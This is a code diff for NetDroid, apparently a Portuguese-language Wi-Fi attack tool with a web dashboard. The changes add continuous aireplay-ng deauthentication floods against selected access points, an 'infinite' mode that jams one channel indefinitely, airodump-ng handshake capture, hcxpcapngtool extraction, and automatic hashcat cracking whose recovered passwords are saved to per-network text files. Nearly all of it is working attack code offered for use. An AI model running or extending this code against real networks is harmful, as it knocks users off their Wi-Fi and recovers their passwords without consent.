@@ -114,9 +114,12 @@ except Exception:
     HAS_REPORTLAB = False
 
 # ═══════════════════════ CONSTANTS ════════════════════════════
-VERSION = "1.5.6"
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/yamotoz/NetDroid/main/NetDroid.py"
-GITHUB_VERSION_URL = "https://raw.githubusercontent.com/yamotoz/NetDroid/main/VERSION"
+VERSION = "1.5.8"
+GITHUB_REPO = "yamotoz/NetDroid"
+GITHUB_BRANCHES = ("master", "main")  # tenta master 1º (default atual), main como fallback
+GITHUB_RAW_TEMPLATE = "https://raw.githubusercontent.com/{repo}/{branch}/{path}"
+GITHUB_RAW_URL = GITHUB_RAW_TEMPLATE.format(repo=GITHUB_REPO, branch="master", path="NetDroid.py")
+GITHUB_VERSION_URL = GITHUB_RAW_TEMPLATE.format(repo=GITHUB_REPO, branch="master", path="VERSION")
 HAS_NMAP_BIN = bool(shutil.which("nmap"))
 NETBIOS_MESSAGE = "O relogio bate as 4"
 DEFAULT_SCAN_MODE = "normal"
@@ -181,8 +184,11 @@ PASS_DIR = Path("Pass")              # senhas quebradas (append-only)
 IMPORTS_DIR = Path("imports")        # exports de zonas (PDF + TXT)
 DEAUTH_THREAD_LIMIT = 100            # max threads deauth simultâneas (carrossel + reserva)
 CARROSSEL_SLOT_VERMELHA_S = 15       # tempo por canal quando só há APs em vermelha
-CARROSSEL_SLOT_AZUL_S = 20           # tempo por canal quando há APs em azul (handshake)
+CARROSSEL_SLOT_AZUL_S = 10           # tempo por canal quando há APs em azul (handshake)
 CARROSSEL_AIRODUMP_BOOT_S = 1.5      # pausa entre airodump up e aireplay bursts
+CARROSSEL_AZUL_FLUSH_S = 1.5         # pausa pós-slot pro airodump flushar cap antes da validação
+AZUL_DIR = HANDSHAKE_DIR / "azul"    # 1 pasta por BSSID com handshake.cap+22000
+SLOT_TEMP_DIR = HANDSHAKE_DIR / "_slot_temp"  # caps temp do carrossel (deletados)
 
 # Tabela canal ↔ frequência 802.11 (preenche '?' automaticamente quando
 # uma fonte traz canal mas não freq, ou vice-versa)
@@ -3974,7 +3980,32 @@ class KamikaseEngine:
                           contextual: bool = True, stop_on_crack: bool = True):
         """Chamado pelo dashboard via WebSocket quando o usuário arrasta
         um AP entre zonas. Dispara/encerra ataque deauth ou crack queue.
-        Suporta wordlist única (legado) ou wordlists (array para fila sequencial)."""
+        Suporta wordlist única (legado) ou wordlists (array para fila sequencial).
+
+        v1.5.8: vermelha e azul são MUTUAMENTE EXCLUSIVAS (decisão do usuário).
+        Se há APs na vermelha e o destino é azul (ou vice-versa), os APs da
+        zona conflitante são automaticamente movidos pra verde antes."""
+        # MUTEX zona azul ↔ vermelha
+        if destino in ("vermelha", "azul"):
+            zona_conflito = "azul" if destino == "vermelha" else "vermelha"
+            with self.zonas_lock:
+                conflitos = list(self.zonas.get(zona_conflito, []))
+            if conflitos:
+                self.ui.warn(f"⚠ Zona {zona_conflito} tinha {len(conflitos)} AP(s) — "
+                              f"movendo todos pra verde (mutex com {destino})")
+                for b in conflitos:
+                    with self.zonas_lock:
+                        if b in self.zonas[zona_conflito]:
+                            self.zonas[zona_conflito].remove(b)
+                        if b not in self.zonas["verde"]:
+                            self.zonas["verde"].append(b)
+                    ap_c = next((a for a in self.alvos if a["bssid"] == b), None)
+                    if ap_c:
+                        emitir("ap_update", **ap_c)
+                try: emitir("zona_mutex", origem=zona_conflito,
+                              destino=destino, movidos=len(conflitos))
+                except Exception: pass
+
         # Localiza AP e remove de qualquer zona atual
         with self.zonas_lock:
             origem = ""
@@ -5323,6 +5354,14 @@ class KamikaseEngine:
             except Exception:
                 pass
 
+        if self.ctx.motor == "root-kali":
+            try:
+                subprocess.run(["systemctl", "restart", "NetworkManager"],
+                               timeout=10, check=False,
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception:
+                pass
+
     # ─── AUDIT LOG ───────────────────────────────────────────
 
     def _audit_log_inicio(self):
@@ -5727,7 +5766,7 @@ class PMKIDCapture:
             tamanho = cap_file.stat().st_size
         except Exception:
             return False
-        if tamanho < 1024:
+        if tamanho <= 24:
             return False
         # Caminho ideal: hcxpcapngtool — match perfeito com etapa de conversão
         if HAS_HCXPCAPNGTOOL:
@@ -5746,18 +5785,21 @@ class PMKIDCapture:
                     except Exception: pass
             # hcxpcapngtool rodou mas não extraiu → SEM handshake
             return False
-        # Fallback aircrack-ng (sem -a2/-w pra evitar erro de wordlist vazia)
-        if HAS_AIRCRACK:
-            try:
-                r = subprocess.run(["aircrack-ng", str(cap_file)],
-                                    capture_output=True, text=True, timeout=8)
-                saida = (r.stdout or "")
-                # aircrack mostra "WPA (X handshake)" só com handshake completo
-                if re.search(r"WPA.*\(\s*[1-9]\d*\s+handshake", saida,
-                              re.IGNORECASE):
-                    return True
-            except Exception:
-                pass
+        # Fallback usando scapy para contar EAPOLs (mais confiável que aircrack-ng sem wordlist)
+        try:
+            import scapy.all as scapy
+            pkts = scapy.rdpcap(str(cap_file))
+            eapol_count = sum(1 for p in pkts if p.haslayer(scapy.EAPOL))
+            # Hashcat consegue quebrar com os frames 1 e 2.
+            if eapol_count >= 2:
+                print(f"DEBUG EAPOL COUNT: {eapol_count} (APROVADO)")
+                return True
+            else:
+                print(f"DEBUG EAPOL COUNT: {eapol_count} (REJEITADO - menos de 2)")
+        except Exception as e:
+            print(f"DEBUG SCAPY EXCEPTION: {e}")
+            pass
+        
         return False
 
 
@@ -5785,6 +5827,36 @@ class CarrosselCanal:
         self.canal_inicio: float = 0.0
         self.canal_slot_s: int = 0
         self.canais_pendentes: List[int] = []
+        # Modo infinito: trava em UM canal só, não rotaciona
+        self.modo_infinito = False
+        self.canal_lockado: Optional[int] = None
+
+    def set_slot_vermelha(self, segundos: int = 15, infinito: bool = False,
+                            canal_lock: Optional[int] = None) -> None:
+        """Configura duração do slot da zona vermelha. Se infinito=True,
+        trava em UM canal e não rotaciona (modo lock-on-channel).
+        Default canal_lock = primeiro canal com AP em vermelha."""
+        if infinito:
+            self.modo_infinito = True
+            if canal_lock is None:
+                grupos = self._agrupar_por_canal()
+                for ch in sorted(grupos.keys()):
+                    if grupos[ch]["vermelha"] or grupos[ch]["azul"]:
+                        canal_lock = ch
+                        break
+            self.canal_lockado = canal_lock
+            self.eng.ui.warn(f"🔒 Modo infinito: travado em ch{canal_lock or '?'}")
+        else:
+            self.modo_infinito = False
+            self.canal_lockado = None
+            self.slot_vermelha = max(5, int(segundos))
+            self.eng.ui.info(f"⏱ Slot vermelha: {self.slot_vermelha}s")
+        try: emitir("carrossel_config",
+                     slot_vermelha=self.slot_vermelha,
+                     slot_azul=self.slot_azul,
+                     infinito=self.modo_infinito,
+                     canal_lockado=self.canal_lockado)
+        except Exception: pass
 
     def iniciar(self) -> None:
         with self.lock:
@@ -5794,6 +5866,13 @@ class CarrosselCanal:
             self.thread = threading.Thread(target=self._loop, daemon=True,
                                             name="carrossel-canal")
             self.thread.start()
+        # Limpa slot caps órfãos de execuções anteriores que crasharam
+        try:
+            if SLOT_TEMP_DIR.exists():
+                for f in SLOT_TEMP_DIR.iterdir():
+                    try: f.unlink()
+                    except Exception: pass
+        except Exception: pass
         self.eng.ui.info("🔄 Carrossel de canal iniciado")
         try: emitir("carrossel_status", ativo=True)
         except Exception: pass
@@ -5864,6 +5943,27 @@ class CarrosselCanal:
             canais = sorted(grupos.keys())
             with self.lock:
                 self.canais_pendentes = list(canais)
+
+            # MODO INFINITO: trava em UM canal só, não rotaciona
+            if self.modo_infinito:
+                # Se canal_lockado vazio ou inválido, escolhe o primeiro com APs
+                if self.canal_lockado not in grupos:
+                    self.canal_lockado = canais[0] if canais else None
+                if self.canal_lockado is None:
+                    if self.stop_event.wait(2.0): break
+                    continue
+                grupo = grupos.get(self.canal_lockado, {"vermelha": [], "azul": []})
+                if not (grupo["vermelha"] or grupo["azul"]):
+                    if self.stop_event.wait(2.0): break
+                    continue
+                slot_s = self.slot_azul if grupo["azul"] else self.slot_vermelha
+                try:
+                    self._executar_slot(self.canal_lockado, grupo, slot_s)
+                except Exception as e:
+                    eng.ui.warn(f"Slot infinito ch{self.canal_lockado} falhou: {e}")
+                continue
+
+            # MODO NORMAL: rotaciona entre canais
             for canal in canais:
                 if self.stop_event.is_set(): break
                 grupo = grupos.get(canal, {"vermelha": [], "azul": []})
@@ -5883,13 +5983,14 @@ class CarrosselCanal:
         if not iface:
             return
 
-        # 1. Trava o canal
         if HAS_IW:
             try:
-                subprocess.run(["iw", "dev", iface, "set", "channel", str(canal)],
-                                timeout=3, check=False,
-                                stdout=subprocess.DEVNULL,
-                                stderr=subprocess.DEVNULL)
+                subprocess.run(
+                    ["iw", "dev", iface, "set", "channel", str(canal)],
+                    timeout=3, check=False,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
             except Exception:
                 pass
 
@@ -5898,26 +5999,47 @@ class CarrosselCanal:
             self.canal_inicio = time.time()
             self.canal_slot_s = slot_s
 
-        try: emitir("carrossel_slot", canal=canal,
-                     vermelha=len(grupo["vermelha"]),
-                     azul=len(grupo["azul"]),
-                     slot_s=slot_s)
-        except Exception: pass
+        try:
+            emitir("carrossel_slot", canal=canal,
+                   vermelha=len(grupo["vermelha"]),
+                   azul=len(grupo["azul"]),
+                   slot_s=slot_s)
+        except Exception:
+            pass
 
-        eng.ui.info(f"🔄 Slot ch{canal} · {len(grupo['vermelha'])} vermelha "
-                    f"+ {len(grupo['azul'])} azul · {slot_s}s")
+        eng.ui.info(
+            f"🔄 Slot ch{canal} · {len(grupo['vermelha'])} vermelha "
+            f"+ {len(grupo['azul'])} azul · {slot_s}s"
+        )
 
-        # 2. Sobe airodump (só se há AP azul pra capturar handshake)
         p_dump: Optional[subprocess.Popen] = None
         cap_file: Optional[Path] = None
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        azul_bssids = [ap["bssid"] for ap in grupo["azul"]]
         if grupo["azul"] and HAS_AIRODUMP:
-            cap_base = HANDSHAKE_DIR / f"slot_ch{canal}_{ts}"
             try:
+                SLOT_TEMP_DIR.mkdir(parents=True, exist_ok=True)
+            except Exception:
+                pass
+            cap_base = SLOT_TEMP_DIR / f"slot_ch{canal}_{ts}"
+            try:
+                cmd_dump = [
+                    "airodump-ng", "--channel", str(canal),
+                    "-w", str(cap_base), "--output-format", "cap",
+                    "--write-interval", "1", iface,
+                ]
+                if len(azul_bssids) == 1:
+                    cmd_dump = [
+                        "airodump-ng", "--bssid", azul_bssids[0],
+                        "--channel", str(canal),
+                        "-w", str(cap_base), "--output-format", "cap",
+                        "--write-interval", "1", iface,
+                    ]
                 p_dump = subprocess.Popen(
-                    ["airodump-ng", "--channel", str(canal),
-                     "-w", str(cap_base), "--output-format", "cap", iface],
-                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    cmd_dump,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
                 cap_file = Path(str(cap_base) + "-01.cap")
                 time.sleep(CARROSSEL_AIRODUMP_BOOT_S)
             except Exception as e:
@@ -5925,49 +6047,68 @@ class CarrosselCanal:
                 p_dump = None
                 cap_file = None
 
-        # 3. Sobe aireplay --deauth 0 pra cada AP (vermelha + azul) no canal
+        # v1.5.8: SIMPLIFICAÇÃO CIRÚRGICA — vermelha e azul são mutuamente
+        # exclusivas (decisão do usuário), então grupo terá APENAS uma das
+        # duas zonas populada. Comportamento idêntico em ambos casos:
+        # aireplay-ng --deauth 0 contínuo + airodump escutando, pelo slot
+        # inteiro. Sem early-stop, sem listen-extra. Espelho da vermelha.
         procs: List[Tuple[str, subprocess.Popen, str]] = []
+        aps_alvo = grupo["vermelha"] + grupo["azul"]
+        zona_corrente = "azul" if grupo["azul"] else ("vermelha" if grupo["vermelha"] else "")
         if HAS_AIREPLAY:
-            for ap in grupo["vermelha"] + grupo["azul"]:
+            for ap in aps_alvo:
                 bssid = ap["bssid"]
-                zona_ap = "vermelha" if ap in grupo["vermelha"] else "azul"
                 try:
                     p = subprocess.Popen(
                         ["aireplay-ng", "--deauth", "0", "--ignore-negative-one",
                          "-a", bssid, iface],
-                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    procs.append((bssid, p, zona_ap))
-                except Exception:
-                    pass
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                    )
+                    procs.append((bssid, p, zona_corrente))
+                    if zona_corrente == "azul":
+                        ap["crack"] = {
+                            "status": "capturing",
+                            "progresso": 0.0,
+                            "eta": "?",
+                            "tentativa": ap.get("crack", {}).get("tentativa", 0) + 1,
+                        }
+                        emitir("ap_update", **ap)
+                        try: emitir("handshake_log", bssid=bssid,
+                                      msg=f"▶ ch{canal} aireplay --deauth 0 + airodump ON ({slot_s}s)")
+                        except Exception: pass
+                except Exception as e:
+                    eng.ui.warn(f"  aireplay {bssid} falhou: {e}")
 
-        # 4. Aguarda slot, atualiza UI 1×/s
         inicio = time.time()
         while time.time() - inicio < slot_s:
-            if self.stop_event.is_set(): break
+            if self.stop_event.is_set():
+                break
             elapsed = time.time() - inicio
             restante = max(0, slot_s - int(elapsed))
-            # Contador de pacotes (~64/s por aireplay vivo)
+
             for bssid, p, _zona in procs:
-                if p.poll() is not None: continue
+                if p.poll() is not None:
+                    continue
                 with eng.contador_lock:
                     eng.contador_global += 64
                     eng.contador_por_bssid[bssid] = eng.contador_por_bssid.get(bssid, 0) + 64
-            # Emit tick global pro frontend
             try:
                 with self.lock:
                     pendentes = list(self.canais_pendentes)
                 emitir("carrossel_tick", canal=canal, restante_s=restante,
                         slot_s=slot_s, ativo=True, canais_pendentes=pendentes)
-            except Exception: pass
-            # ap_update pra cada AP no slot (atualiza badge "atacando")
-            for ap in grupo["vermelha"] + grupo["azul"]:
+            except Exception:
+                pass
+            for ap in aps_alvo:
                 ap["pacotes"] = eng.contador_por_bssid.get(ap["bssid"], 0)
                 ap["carrossel_canal"] = canal
                 ap["carrossel_slot_restante"] = restante
                 emitir("ap_update", **ap)
-            if self.stop_event.wait(1.0): break
+            if self.stop_event.wait(1.0):
+                break
 
-        # 5. Mata todos os aireplays
+        # Termina aireplays de uma vez
         for _bssid, p, _zona in procs:
             try: p.terminate()
             except Exception: pass
@@ -5977,7 +6118,7 @@ class CarrosselCanal:
                 try: p.kill()
                 except Exception: pass
 
-        # 6. Para airodump e checa cap pra cada AP azul desse canal
+        # Termina airodump e dá flush time pro cap aterrissar antes da validação
         if p_dump:
             try: p_dump.terminate()
             except Exception: pass
@@ -5985,19 +6126,190 @@ class CarrosselCanal:
             except Exception:
                 try: p_dump.kill()
                 except Exception: pass
-            if cap_file and cap_file.exists() and cap_file.stat().st_size > 1024:
-                for ap in grupo["azul"]:
-                    bssid = ap["bssid"]
-                    try:
-                        if PMKIDCapture._cap_tem_handshake(cap_file, bssid):
-                            self._registrar_handshake_azul(ap, cap_file)
-                    except Exception as e:
-                        eng.ui.warn(f"  check {bssid} falhou: {e}")
+            time.sleep(CARROSSEL_AZUL_FLUSH_S)
+            if cap_file and cap_file.exists():
+                tamanho = cap_file.stat().st_size
+                eng.ui.info(
+                    f"  📥 cap ch{canal}: {tamanho}B — validando "
+                    f"{len(grupo['azul'])} AP(s) azul…"
+                )
+                try:
+                    emitir("handshake_log", bssid=f"ch{canal}",
+                           msg=f"cap {tamanho}B, validando {len(grupo['azul'])} AP(s)")
+                except Exception:
+                    pass
+                if tamanho > 24:
+                    for ap in grupo["azul"]:
+                        try:
+                            self._validar_e_extrair_handshake_azul(cap_file, ap)
+                        except Exception as e:
+                            eng.ui.warn(f"  validar {ap['bssid']} falhou: {e}")
+                else:
+                    eng.ui.warn(f"  cap inválido ({tamanho}B) — pulando")
+            else:
+                eng.ui.warn(f"  cap não encontrado em {cap_file} — airodump pode ter falhado")
+            for f in SLOT_TEMP_DIR.glob(f"slot_ch{canal}_{ts}*"):
+                try:
+                    f.unlink()
+                except Exception:
+                    pass
 
-        # Limpa marcador "atacando" dos APs deste slot
         for ap in grupo["vermelha"] + grupo["azul"]:
             ap.pop("carrossel_slot_restante", None)
             emitir("ap_update", **ap)
+
+    def _validar_e_extrair_handshake_azul(self, slot_cap: Path,
+                                              ap: Dict[str, Any]) -> bool:
+        """Tenta extrair handshake DESTE BSSID do slot cap usando
+        `hcxpcapngtool --apmac=<MAC>` (filtro nativo). Se gera .22000
+        não-vazio: handshake real → copia tudo pra `handshakes/azul/<BSSID>/`
+        e enfileira hashcat. Idempotente."""
+        eng = self.eng
+        bssid = ap["bssid"]
+        ap_dir = AZUL_DIR / bssid.replace(":", "")
+        try:
+            ap_dir.mkdir(parents=True, exist_ok=True)
+        except Exception as e:
+            eng.ui.warn(f"  mkdir {ap_dir} falhou: {e}")
+            return False
+
+        # Sem hcxpcapngtool não dá pra filtrar por BSSID com .22000 —
+        # usamos contagem de EAPOL via scapy como fallback.
+        if not HAS_HCXPCAPNGTOOL:
+            eng.ui.info(f"  🔍 {bssid} scapy fallback (sem hcxpcapngtool)...")
+            tem = PMKIDCapture._cap_tem_handshake(slot_cap, bssid)
+            eng.ui.info(f"  {bssid} scapy validator: {'HANDSHAKE VÁLIDO' if tem else 'sem handshake completo'}")
+            try: emitir("handshake_log", bssid=bssid,
+                          msg=f"fallback validator: {'HANDSHAKE VÁLIDO' if tem else 'incompleto'}")
+            except Exception: pass
+            if tem:
+                cap_dest = ap_dir / "handshake.cap"
+                try:
+                    shutil.copy(str(slot_cap), str(cap_dest))
+                    ap["handshake_path"] = str(cap_dest)
+                    ap["handshake_em"] = datetime.now().isoformat()
+                    if eng.memoria:
+                        try: eng.memoria.registrar_handshake(bssid, ap.get("essid", ""), cap_dest)
+                        except Exception: pass
+                    emitir("handshake_capturado", bssid=bssid, pcap=str(cap_dest))
+                    eng.ui.success(f"  ✓ Handshake capturado: {bssid} ({ap.get('essid','?')}) → {ap_dir}")
+                    self._enfileirar_hashcat_azul(ap, cap_dest, None)
+                    return True
+                except Exception as e:
+                    eng.ui.warn(f"  copy cap falhou: {e}")
+                    return False
+            return False
+
+        tool = shutil.which("hcxpcapngtool") or shutil.which("hcxpcaptool")
+        out_22000 = ap_dir / "handshake.22000"
+        # Limpa qualquer .22000 anterior (pode ser de tentativa antiga vazia)
+        try:
+            if out_22000.exists() and out_22000.stat().st_size == 0:
+                out_22000.unlink()
+        except Exception: pass
+
+        saida = ""
+        filtros_apmac = [bssid.lower(), bssid.replace(":", "").lower()]
+        houve_erro = False
+        for apmac in filtros_apmac:
+            try:
+                if out_22000.exists():
+                    out_22000.unlink()
+            except Exception:
+                pass
+            try:
+                r = subprocess.run([tool, f"--apmac={apmac}",
+                                     "-o", str(out_22000), str(slot_cap)],
+                                    capture_output=True, text=True, timeout=15)
+                saida = ((r.stdout or "") + (r.stderr or ""))[:200].replace('\n', ' | ')
+                if out_22000.exists() and out_22000.stat().st_size > 0:
+                    break
+            except Exception as e:
+                houve_erro = True
+                saida = str(e)
+                continue
+
+        existe = out_22000.exists()
+        tamanho_22000 = out_22000.stat().st_size if existe else 0
+        eng.ui.info(f"  🔍 {bssid} hcx_out={tamanho_22000}B → "
+                      f"{'✓ HANDSHAKE' if tamanho_22000 > 0 else '✗ vazio'}")
+        try: emitir("handshake_log", bssid=bssid,
+                      msg=f"hcx={tamanho_22000}B {'✓' if tamanho_22000 > 0 else '✗ sem hash'}")
+        except Exception: pass
+
+        if not existe or tamanho_22000 == 0:
+            if houve_erro and saida:
+                eng.ui.warn(f"  hcxpcapngtool falhou pra {bssid}: {saida}")
+                try: emitir("handshake_log", bssid=bssid,
+                              msg=f"hcxpcapngtool error: {saida}")
+                except Exception: pass
+            # Sem handshake pra ESTE BSSID — limpa arquivo vazio e segue
+            if existe:
+                try: out_22000.unlink()
+                except Exception: pass
+            return False
+
+        # SUCESSO: copia o cap inteiro pra pasta do AP
+        cap_dest = ap_dir / "handshake.cap"
+        try:
+            shutil.copy(str(slot_cap), str(cap_dest))
+        except Exception as e:
+            eng.ui.warn(f"  copy cap falhou: {e}")
+            return False
+
+        ap["handshake_path"] = str(cap_dest)
+        ap["hash_path"] = str(out_22000)
+        ap["handshake_em"] = datetime.now().isoformat()
+
+        # Persiste na memória (db.json)
+        if eng.memoria:
+            try: eng.memoria.registrar_handshake(bssid, ap.get("essid", ""), cap_dest)
+            except Exception: pass
+
+        emitir("handshake_capturado", bssid=bssid, pcap=str(cap_dest),
+                hash_22000=str(out_22000))
+        eng.ui.success(f"  ✓ Handshake REAL: {bssid} ({ap.get('essid','?')}) "
+                          f"→ {ap_dir}")
+
+        # Enfileira hashcat
+        self._enfileirar_hashcat_azul(ap, cap_dest, out_22000)
+        return True
+
+    def _enfileirar_hashcat_azul(self, ap: Dict[str, Any],
+                                   cap_dest: Path,
+                                   hash_22000: Optional[Path]) -> None:
+        eng = self.eng
+        bssid = ap["bssid"]
+        wls = ap.get("crack_wordlists") or []
+        if not (wls and eng.hashcat_worker):
+            ap["crack"] = {"status": "captured_no_wl",
+                            "erro": "handshake pego — configure wordlists",
+                            "progresso": 0.0, "eta": "?"}
+            emitir("ap_update", **ap)
+            return
+        wl_paths: List[Path] = []
+        for w in wls:
+            wp = Path(w) if Path(w).is_absolute() else WORDLIST_DIR / w
+            if wp.exists():
+                wl_paths.append(wp)
+        if not wl_paths:
+            ap["crack"] = {"status": "wordlist_missing",
+                            "erro": "wordlists não encontradas",
+                            "progresso": 0.0, "eta": "?"}
+            emitir("ap_update", **ap)
+            return
+        ap["crack"] = {"status": "queued", "progresso": 0.0, "eta": "?",
+                        "wordlists": [p.name for p in wl_paths]}
+        emitir("ap_update", **ap)
+        try:
+            eng.hashcat_worker.enfileirar(
+                bssid=bssid, essid=ap.get("essid", ""),
+                pcapng=cap_dest,
+                perfil=ap.get("crack_perfil", "low"),
+                wordlists=wl_paths,
+                contextual=True)
+        except Exception as e:
+            eng.ui.warn(f"  enfileirar hashcat falhou: {e}")
 
     def _registrar_handshake_azul(self, ap: Dict[str, Any], cap_file: Path) -> None:
         """Persiste handshake do AP azul, registra na memória, enfileira no
@@ -6684,8 +6996,38 @@ class HashcatWorker:
             self.memoria.registrar_senha(
                 item["bssid"], item["senha"],
                 wordlist=item.get("wordlist_efetiva", "") or item.get("wordlist", ""))
+            self._persistir_resultado_azul_txt(
+                item["bssid"],
+                item.get("essid", "") or "?",
+                item["senha"],
+                item.get("wordlist_quebrou") or item.get("wordlist_efetiva", "") or item.get("wordlist", ""),
+                item.get("pcapng", ""),
+            )
         emitir("hashcat_done", item=item)
         self.resultados.append(item)
+
+    def _persistir_resultado_azul_txt(self, bssid: str, essid: str,
+                                       senha: str, wordlist: str,
+                                       pcapng: str) -> None:
+        """Se o job veio da pasta dedicada da zona azul, grava um resumo txt
+        com rede e senha ao lado do handshake para o operador consultar rápido."""
+        try:
+            p = Path(pcapng)
+            pasta_bssid = AZUL_DIR / bssid.replace(":", "")
+            if p.parent.resolve() != pasta_bssid.resolve():
+                return
+            out_txt = pasta_bssid / "resultado.txt"
+            linhas = [
+                f"ESSID: {essid or '?'}",
+                f"BSSID: {bssid}",
+                f"Senha: {senha}",
+                f"Wordlist: {wordlist or '?'}",
+                f"Handshake: {pcapng}",
+                f"Quebrada em: {datetime.now().isoformat()}",
+            ]
+            out_txt.write_text("\n".join(linhas) + "\n", encoding="utf-8")
+        except Exception:
+            pass
 
     def _wordlist_default(self) -> Optional[str]:
         if not WORDLIST_DIR.exists():
@@ -7091,6 +7433,26 @@ class LiveDashboard:
             except Exception as e:
                 dash.ui.warn(f"Erro ao reiniciar crack para {bssid}: {e}")
 
+        @sio.on("set_slot_vermelha")
+        def on_set_slot_vermelha(data):
+            """Configura duração do slot vermelha (15s/60s/300s/3600s) ou
+            ativa modo infinito (lock-on-channel). Default 15s."""
+            if dash.modo != "kamikase" or not dash.kami_engine:
+                return
+            eng = dash.kami_engine
+            if not eng.carrossel:
+                # Garante carrossel rodando pra setar config (mesmo idle)
+                try: eng._garantir_carrossel()
+                except Exception: pass
+            if not eng.carrossel:
+                return
+            try:
+                infinito = bool(data.get("infinito", False))
+                segundos = int(data.get("segundos", 15))
+                eng.carrossel.set_slot_vermelha(segundos=segundos, infinito=infinito)
+            except Exception as e:
+                dash.ui.warn(f"set_slot_vermelha falhou: {e}")
+
         @sio.on("recapturar_handshake")
         def on_recapturar_handshake(data):
             """Cancela captura em andamento e refaz do zero (zona azul)."""
@@ -7102,6 +7464,29 @@ class LiveDashboard:
                 dash.ui.info(f"🔄 Recaptura iniciada para {bssid}")
             except Exception as e:
                 dash.ui.warn(f"Erro ao recapturar {bssid}: {e}")
+
+        @app.route("/api/restaurar_wifi", methods=["POST"])
+        def api_restaurar_wifi():
+            """Restaura WiFi: sai de monitor mode e volta para managed.
+            Para o carrossel, mata processos ativos, restaura a interface."""
+            if not dash.kami_engine:
+                return jsonify({"erro": "engine não inicializado"}), 400
+            eng = dash.kami_engine
+            try:
+                # Para o carrossel (mata aireplays e airodumps em curso)
+                if eng.carrossel:
+                    try: eng.carrossel.parar()
+                    except Exception: pass
+                # Restaura interface de monitor → managed
+                eng._restaurar_iface()
+                eng.monitor_ativo = False
+                eng.ui.success("✓ WiFi restaurado — modo managed ativo")
+                try: emitir("wifi_restaurado", iface=eng.iface_orig)
+                except Exception: pass
+                return jsonify({"ok": True, "msg": "WiFi restaurado — modo managed ativo"})
+            except Exception as e:
+                eng.ui.error(f"Erro ao restaurar WiFi: {e}")
+                return jsonify({"erro": str(e)}), 500
 
 
 # ══════════════════ TEMPLATES HTML ═════════════════════════════
@@ -7829,9 +8214,20 @@ TEMPLATE_KAMIKASE = r"""<!doctype html>
 
   <!-- ZONA VERMELHA -->
   <section class="col-span-12 md:col-span-6 lg:col-span-4 glass rounded-lg p-4 zone-red">
-    <div class="flex items-center justify-between mb-2">
+    <div class="flex items-center justify-between mb-2 flex-wrap gap-2">
       <h2 class="sec" style="color:var(--red)">🔴 Vermelha · Sob Deauth</h2>
-      <span class="text-xs text-gray-500 blink">1 pkt / 0.2s · ∞</span>
+      <div class="flex items-center gap-2">
+        <label class="text-[0.65rem] text-gray-500 uppercase tracking-wider">slot:</label>
+        <select id="slot-vermelha-sel" onchange="setSlotVermelha(this.value)"
+                class="bg-gray-900 border border-red-700/50 text-red-300 text-xs rounded px-2 py-1"
+                aria-label="Duração do slot do carrossel vermelha">
+          <option value="15" selected>15s (padrão)</option>
+          <option value="60">1 min</option>
+          <option value="300">5 min</option>
+          <option value="3600">1 hora</option>
+          <option value="infinito">∞ Infinito (1 canal)</option>
+        </select>
+      </div>
     </div>
     <div class="flex gap-1 mb-3 flex-wrap">
       <button onclick="moverTodos('vermelha','verde')" class="btn-zone btn-green" aria-label="Parar deauth de todos os APs">← todos verde</button>
@@ -7852,6 +8248,7 @@ TEMPLATE_KAMIKASE = r"""<!doctype html>
       <button onclick="moverTodos('azul','vermelha')" class="btn-zone btn-red" aria-label="Mover todos para deauth">→ todos vermelha</button>
       <button onclick="selecionarTodos('azul')" class="btn-zone bg-gray-800 text-yellow-400" aria-label="Selecionar todos da zona azul">selecionar tudo</button>
       <button onclick="exportarZona('azul')" class="btn-zone btn-export" aria-label="Exportar APs da zona azul (com senhas) para PDF e TXT">📤 exportar</button>
+      <button onclick="restaurarWifi()" id="btn-restaurar-wifi" class="btn-zone" style="background:rgba(0,212,255,0.15); border:1px solid var(--cyan); color:var(--cyan);" aria-label="Restaurar WiFi (sair do monitor mode)">📶 Restaurar WiFi</button>
     </div>
     <div id="z-azul" class="space-y-2 min-h-[200px] zone-scroll"></div>
   </section>
@@ -8666,11 +9063,50 @@ function resetCrack(bssid, recapturar){
   sock.emit("reset_crack", {bssid, recapturar});
   log(`↻ ${acao} para ${bssid}`, "warn");
 }
+function setSlotVermelha(val){
+  if(val === "infinito"){
+    sock.emit("set_slot_vermelha", {infinito: true});
+    log("🔒 Modo infinito ativado — carrossel trava em 1 canal", "warn");
+    toast("🔒 Modo infinito · trava em 1 canal");
+  } else {
+    const seg = parseInt(val) || 15;
+    sock.emit("set_slot_vermelha", {segundos: seg, infinito: false});
+    const label = seg >= 3600 ? `${seg/3600}h` : seg >= 60 ? `${seg/60}min` : `${seg}s`;
+    log(`⏱ Slot vermelha alterado: ${label}`, "info");
+    toast(`⏱ Slot vermelha: ${label}`);
+  }
+}
+
 function recapturarHandshake(bssid){
   if(!confirm(`Cancelar captura atual e recapturar handshake do zero para ${aps[bssid]?.essid || bssid}?`)) return;
   sock.emit("recapturar_handshake", {bssid});
   log(`🔄 Recaptura solicitada para ${bssid}`, "warn");
   toast(`🔄 Recapturando ${aps[bssid]?.essid || bssid}…`);
+}
+
+// ─── Restaurar WiFi (sair do monitor mode) ──────
+async function restaurarWifi(){
+  if(!confirm("Restaurar WiFi?\n\nIsso vai:\n• Parar o carrossel de ataques\n• Sair do monitor mode\n• Restaurar conexão WiFi normal\n\nAPs em vermelha/azul continuarão na lista mas sem ataque ativo.")) return;
+  const btn = document.getElementById("btn-restaurar-wifi");
+  const original = btn ? btn.innerHTML : null;
+  if(btn){ btn.innerHTML = "⏳ Restaurando..."; btn.disabled = true; }
+  try {
+    const r = await fetch("/api/restaurar_wifi", {method:"POST"});
+    const data = await r.json();
+    if(data.erro){
+      toast(`❌ Erro: ${data.erro}`);
+      log(`Erro ao restaurar WiFi: ${data.erro}`, "err");
+    } else {
+      toast("📶 WiFi restaurado — modo managed ativo");
+      log("📶 WiFi restaurado com sucesso — placa voltou ao modo managed", "ok");
+      setLEDStatus("on");
+    }
+  } catch(e){
+    toast(`❌ Falha: ${e.message}`);
+    log(`Falha ao restaurar WiFi: ${e.message}`, "err");
+  } finally {
